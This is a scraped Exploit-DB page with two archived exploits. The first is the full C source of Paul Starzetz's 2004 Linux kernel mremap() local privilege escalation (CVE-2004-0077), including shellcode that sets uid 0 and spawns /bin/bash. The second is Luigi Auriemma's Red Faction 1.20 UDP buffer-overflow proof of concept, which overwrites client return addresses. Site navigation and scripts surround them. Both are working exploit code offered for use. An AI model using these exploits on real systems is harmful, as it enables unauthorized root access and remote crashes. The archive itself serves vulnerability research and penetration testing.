Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 160
Linux Kernel 2.2.25/2.4.24/2.6.2 - 'mremap()' Local Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLinux Kernel 2.2.25/2.4.24/2.6.2 - 'mremap()' Local Privilege EscalationEDB-ID:160CVE:2004-0077EDB Verified:Author:Paul StarzetzType:localExploit:/Platform:LinuxDate:2004-03-01Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/***	mremap missing do_munmap return check kernel exploit**	gcc -O3 -static -fomit-frame-pointer mremap_pte.c -o mremap_pte*	./mremap_pte [suid] [[shell]]**	Vulnerable kernel versions are all <= 2.2.25, <= 2.4.24 and <= 2.6.2**	Copyright (c) 2004  iSEC Security Research. All Rights Reserved.**	THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"*	AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION*	WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.**/#include <stdio.h>#include <stdlib.h>#include <errno.h>#include <unistd.h>#include <syscall.h>#include <signal.h>#include <time.h>#include <sched.h>#include <sys/mman.h>#include <sys/wait.h>#include <sys/utsname.h>#include <asm/page.h>#define str(s) #s#define xstr(s) str(s)//	this is for standard kernels with 3/1 split#define STARTADDR	0x40000000#define PGD_SIZE	(PAGE_SIZE * 1024)#define VICTIM		(STARTADDR + PGD_SIZE)#define MMAP_BASE	(STARTADDR + 3*PGD_SIZE)#define DSIGNAL		SIGCHLD#define CLONEFL		(DSIGNAL|CLONE_VFORK|CLONE_VM)#define MREMAP_MAYMOVE	( (1UL) << 0 )#define MREMAP_FIXED	( (1UL) << 1 )#define __NR_sys_mremap	__NR_mremap//	how many ld.so pages? this is the .text section length (like cat//	/proc/self/maps) in pages#define LINKERPAGES	0x14//	suid victimstatic char *suid="/bin/ping";//	shell to startstatic char *launch="/bin/bash";_syscall5(ulong, sys_mremap, ulong, a, ulong, b, ulong, c, ulong, d,ulong, e);unsigned long sys_mremap(unsigned long addr, unsigned long old_len,unsigned long new_len, unsigned long flags,unsigned long new_addr);static volatile unsigned base, *t, cnt, old_esp, prot, victim=0;static int i, pid=0;static char *env[2], *argv[2];static ulong ret;//	code to appear inside the suid imagestatic void suid_code(void){__asm__("		call	callme				\n"//	setresuid(0, 0, 0), setresgid(0, 0, 0)"jumpme:	xorl	%ebx, %ebx			\n""		xorl	%ecx, %ecx			\n""		xorl	%edx, %edx			\n""		xorl	%eax, %eax			\n""		mov	$"xstr(__NR_setresuid)", %al	\n""		int	$0x80				\n""		mov	$"xstr(__NR_setresgid)", %al	\n""		int	$0x80				\n"//	execve(launch)"		popl	%ebx				\n""		andl	$0xfffff000, %ebx		\n""		xorl	%eax, %eax			\n""		pushl	%eax				\n""		movl	%esp, %edx			\n""		pushl	%ebx				\n""		movl	%esp, %ecx			\n""		mov	$"xstr(__NR_execve)", %al	\n""		int	$0x80				\n"//	exit"		xorl	%eax, %eax			\n""		mov	$"xstr(__NR_exit)", %al		\n""		int	$0x80				\n""callme:	jmp	jumpme				\n");}static int suid_code_end(int v){return v+1;}static inline void get_esp(void){__asm__("		movl	%%esp, %%eax			\n""		andl	$0xfffff000, %%eax		\n""		movl	%%eax, %0			\n": : "m"(old_esp));}static inline void cloneme(void){__asm__("		pusha					\n""		movl $("xstr(CLONEFL)"), %%ebx		\n""		movl %%esp, %%ecx			\n""		movl $"xstr(__NR_clone)", %%eax		\n""		int  $0x80				\n""		movl %%eax, %0				\n""		popa					\n": : "m"(pid));}static inline void my_execve(void){__asm__("		movl %1, %%ebx				\n""		movl %2, %%ecx				\n""		movl %3, %%edx				\n""		movl $"xstr(__NR_execve)", %%eax	\n""		int  $0x80				\n": "=a"(ret): "m"(suid), "m"(argv), "m"(env));}static inline void pte_populate(unsigned addr){unsigned r;char *ptr;memset((void*)addr, 0x90, PAGE_SIZE);r = ((unsigned)suid_code_end) - ((unsigned)suid_code);ptr = (void*) (addr + PAGE_SIZE);ptr -= r+1;memcpy(ptr, suid_code, r);memcpy((void*)addr, launch, strlen(launch)+1);}//	hit VMA limit & populate PTEsstatic void exhaust(void){//	mmap PTE donort = mmap((void*)victim, PAGE_SIZE*(LINKERPAGES+3), PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);if(MAP_FAILED==t)goto failed;//	prepare shell code pagesfor(i=2; i<LINKERPAGES+1; i++)pte_populate(victim + PAGE_SIZE*i);i = mprotect((void*)victim, PAGE_SIZE*(LINKERPAGES+3), PROT_READ);if(i)goto failed;//	lock unmapbase = MMAP_BASE;cnt = 0;prot = PROT_READ;printf("\n"); fflush(stdout);for(;;) {t = mmap((void*)base, PAGE_SIZE, prot,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);if(MAP_FAILED==t) {if(ENOMEM==errno)break;elsegoto failed;}if( !(cnt%512) || cnt>65520 )printf("\r    MMAP #%d  0x%.8x - 0x%.8lx", cnt, base,base+PAGE_SIZE); fflush(stdout);base += PAGE_SIZE;prot ^= PROT_EXEC;cnt++;}//	move PTEs & populate page table cacheret = sys_mremap(victim+PAGE_SIZE, LINKERPAGES*PAGE_SIZE, PAGE_SIZE,MREMAP_FIXED|MREMAP_MAYMOVE, VICTIM);if(-1==ret)goto failed;munmap((void*)MMAP_BASE, old_esp-MMAP_BASE);t = mmap((void*)(old_esp-PGD_SIZE-PAGE_SIZE), PAGE_SIZE,PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0,0);if(MAP_FAILED==t)goto failed;*t = *((unsigned *)old_esp);munmap((void*)VICTIM-PAGE_SIZE, old_esp-(VICTIM-PAGE_SIZE));printf("\n[+] Success\n\n"); fflush(stdout);return;failed:printf("\n[-] Failed\n"); fflush(stdout);_exit(0);}static inline void check_kver(void){static struct utsname un;int a=0, b=0, c=0, v=0, e=0, n;uname(&un);n=sscanf(un.release, "%d.%d.%d", &a, &b, &c);if(n!=3 || a!=2) {printf("\n[-] invalid kernel version string\n");_exit(0);}if(b==2) {if(c<=25)v=1;}else if(b==3) {if(c<=99)v=1;}else if(b==4) {if(c>18 && c<=24)v=1, e=1;else if(c>24)v=0, e=0;elsev=1, e=0;}else if(b==5 && c<=75)v=1, e=1;else if(b==6 && c<=2)v=1, e=1;printf("\n[+] kernel %s  vulnerable: %s  exploitable %s",un.release, v? "YES" : "NO", e? "YES" : "NO" );fflush(stdout);if(v && e)return;_exit(0);}int main(int ac, char **av){//	preparecheck_kver();memset(env, 0, sizeof(env));memset(argv, 0, sizeof(argv));if(ac>1) suid=av[1];if(ac>2) launch=av[2];argv[0] = suid;get_esp();//	mmap & clone & execveexhaust();cloneme();if(!pid) {my_execve();} else {waitpid(pid, 0, 0);}return 0;}// milw0rm.com [2004-03-01]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 161
Red Faction 1.20 - Server Reply Remote Buffer Overflow (PoC) - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDRed Faction 1.20 - Server Reply Remote Buffer Overflow (PoC)EDB-ID:161CVE:2004-0345EDB Verified:Author:Luigi AuriemmaType:dosExploit:/Platform:WindowsDate:2004-03-04Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*by Luigi AuriemmaUNIX & WIN VERSION*/#include <stdio.h>#include <stdlib.h>#include <string.h>#ifdef WIN32#include <winsock.h>#include "winerr.h"#define close closesocket#else#include <unistd.h>#include <sys/socket.h>#include <sys/types.h>#include <arpa/inet.h>#include <netdb.h>#endif#define VER "0.1"#define BUFFSZ 2048#define PORT 7755#define RETADDR "\xde\xc0\xad\xde" // 0xdeadc0devoid std_err(void);int main(int argc, char *argv[]) {int sd,on = 1,psz;struct sockaddr_in peer;u_char *buff,info[] ="\x00\x01" // packet number"\x00\x00" // packet size - 4"\x89" // version (x89 = 1.20)"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" // server name (260 bytes)"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"RETADDR "\0""\x00" // type of game"\x01" // players"\x08" // max players"Relentless\0" // mapname"\x00" // dunno?"\x00"; // password:// 4 = yes, 0 = nonesetbuf(stdout, NULL);fputs("\n""RedFaction <= 1.20 broadcast clients buffer overflow "VER"\n""by Luigi Auriemma\n""e-mail: aluigi@altervista.org\n""web: http://aluigi.altervista.org\n""\n", stdout);#ifdef WIN32WSADATA wsadata;WSAStartup(MAKEWORD(1,0), &wsadata);#endifpeer.sin_addr.s_addr = INADDR_ANY;peer.sin_port = htons(PORT);peer.sin_family = AF_INET;psz = sizeof(peer);printf("\nBinding UDP port %u\n", PORT);sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);if(sd < 0) std_err();if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))< 0) std_err();if(bind(sd, (struct sockaddr *)&peer, psz)< 0) std_err();buff = malloc(BUFFSZ);if(!buff) std_err();*(u_short *)(info + 2) = sizeof(info) - 5;printf("Return address of clients will be overwritten with 0x%08lx\n", *(u_long *)RETADDR);fputs("\nClients:\n", stdout);while(1) {if(recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz)< 0) std_err();printf("%s:%hu -> ", inet_ntoa(peer.sin_addr), htons(peer.sin_port));if(sendto(sd, info, sizeof(info) - 1, 0, (struct sockaddr *)&peer, psz)< 0) std_err();fputs("BOOM\n", stdout);}close(sd);return(0);}#ifndef WIN32void std_err(void) {perror("\nError");exit(1);}#endif--------------------------------------------------------------------------------------------------//winerr.h/*Header file used for manage errors in WindowsIt support socket and errno too(this header replace the previous sock_errX.h)*/#include <string.h>#include <errno.h>void std_err(void) {char *error;switch(WSAGetLastError()) {case 10004: error = "Interrupted system call"; break;case 10009: error = "Bad file number"; break;case 10013: error = "Permission denied"; break;case 10014: error = "Bad address"; break;case 10022: error = "Invalid argument (not bind)"; break;case 10024: error = "Too many open files"; break;case 10035: error = "Operation would block"; break;case 10036: error = "Operation now in progress"; break;case 10037: error = "Operation already in progress"; break;case 10038: error = "Socket operation on non-socket"; break;case 10039: error = "Destination address required"; break;case 10040: error = "Message too long"; break;case 10041: error = "Protocol wrong type for socket"; break;case 10042: error = "Bad protocol option"; break;case 10043: error = "Protocol not supported"; break;case 10044: error = "Socket type not supported"; break;case 10045: error = "Operation not supported on socket"; break;case 10046: error = "Protocol family not supported"; break;case 10047: error = "Address family not supported by protocol family"; break;case 10048: error = "Address already in use"; break;case 10049: error = "Can't assign requested address"; break;case 10050: error = "Network is down"; break;case 10051: error = "Network is unreachable"; break;case 10052: error = "Net dropped connection or reset"; break;case 10053: error = "Software caused connection abort"; break;case 10054: error = "Connection reset by peer"; break;case 10055: error = "No buffer space available"; break;case 10056: error = "Socket is already connected"; break;case 10057: error = "Socket is not connected"; break;case 10058: error = "Can't send after socket shutdown"; break;case 10059: error = "Too many references, can't splice"; break;case 10060: error = "Connection timed out"; break;case 10061: error = "Connection refused"; break;case 10062: error = "Too many levels of symbolic links"; break;case 10063: error = "File name too long"; break;case 10064: error = "Host is down"; break;case 10065: error = "No Route to Host"; break;case 10066: error = "Directory not empty"; break;case 10067: error = "Too many processes"; break;case 10068: error = "Too many users"; break;case 10069: error = "Disc Quota Exceeded"; break;case 10070: error = "Stale NFS file handle"; break;case 10091: error = "Network SubSystem is unavailable"; break;case 10092: error = "WINSOCK DLL Version out of range"; break;case 10093: error = "Successful WSASTARTUP not yet performed"; break;case 10071: error = "Too many levels of remote in path"; break;case 11001: error = "Host not found"; break;case 11002: error = "Non-Authoritative Host not found"; break;case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;case 11004: error = "Valid name, no data record of requested type"; break;default: error = strerror(errno); break;}fprintf(stderr, "\nError: %s\n", error);exit(1);}// milw0rm.com [2004-03-04]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort14212223254249536669707980811021051101111131191231351391431611621643833894024064114434444454465025045135145155325485545556176236316556897837878088738889019981000104010891099110011141120119412351471152115331581158916041617172317431761181218581861190019472000202220492100210321212125218122422315237523802381240124802525264028102812294729542990300030303050305231283129318132003217330633333378338934603465350035353632369037903814381740004002407040814105411143224343443445014555459246614750484850005060506150805081509351515180524752505272530854325466555455555600565556665800580358